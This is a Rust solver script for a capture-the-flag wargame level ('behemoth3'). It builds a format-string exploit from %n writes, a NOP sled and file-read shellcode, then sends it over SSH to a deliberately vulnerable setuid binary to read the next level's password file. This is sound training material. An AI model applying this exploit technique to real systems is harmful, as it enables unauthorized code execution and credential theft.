use anyhow::Result;
use crate::util::*;

/// behemoth3 is a fairly simple format string exploit, calling gets on a 200 len buffer and then printing the result:
/// main() {
///     char local_cc [200];
///     printf("Identify yourself: ");
///     fgets(local_cc,200,stdin);
///     printf("Welcome, ");
///     printf(local_cc);
///     puts("\naaaand goodbye again.");
///     return 0;
/// }
/// [*] '/behemoth/behemoth3'
/// Arch:     i386-32-little
/// RELRO:    No RELRO
/// Stack:    No canary found
/// NX:       NX unknown - GNU_STACK missing
/// PIE:      No PIE (0x8048000)
/// Stack:    Executable
/// RWX:      Has RWX segments
///
/// just need to overwrite the ret address (or somewhere in the got) with the stack address to run shellcode
/// idea will be nops + shellcode + padded value + target for lower bytes, padded value + target for higher bytes
pub fn solve(password: &str) -> Result<String> {

    let ret_addr1 = hex::decode("3cd5ffff")?; // 0xffffd52c, found by breaking at ret from main and then p $sp. had to tweak by 16 byte diffs to find the correct value remote
    let ret_addr2 = hex::decode("3ed5ffff")?; // two bytes up to write the higher bytes of the address
    
    // 0xffffd584, approximate location in nop sled. want to set ret to this
    let lower_two = "%1$54395x %1$n".as_bytes(); // print some ridiculous number of spaces, followed by an 'n'. this will write the total amount so far (d584) to the address at n's position, beginning of stack
    let upper_two = "%1$76666x %2$n".as_bytes(); // this again, minus the spaces so far, to try and get the upper four bytes to ffff

    let nop_sled: Vec<u8> = vec![0x90; 40]; 
    let file_read_shellcode = hex::decode(super::READ_FILE_SHELLCODE).unwrap();
    let file_to_read = "/etc/behemoth_pass/behemoth4".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here
    
    let mut full_payload: Vec<u8> = Vec::new();
    full_payload.extend(ret_addr1);
    full_payload.extend(ret_addr2);
    full_payload.extend(lower_two);
    full_payload.extend(upper_two);
    full_payload.extend(nop_sled);
    full_payload.extend(file_read_shellcode);
    full_payload.extend(file_to_read);

    let encoded = hex_literal(&full_payload);

    let session = ssh_session(super::HOST, super::PORT, "behemoth3", password)?;
    let mut channel = session.channel_session()?;
    create_shell(&mut channel)?;

    read_until(&mut channel, "behemoth3@gibson:~$ ")?;
    
    let target = "/behemoth/behemoth3";
    println!("running 'echo -en [payload] | {target}'");

    let cmd = format!("echo -en \"{encoded}\" | {target}");
    write_line(&mut channel, &cmd)?;
    
    println!("reading result");

    let result = read_until(&mut channel, "behemoth3@gibson:~$ ")?;
    let result: Vec<&str> = result.split("\n").collect();
    let result = result[result.len()-2].trim();
    println!("retrieved behemoth4 pass '{result}'\n");

    Ok(result.to_string())
}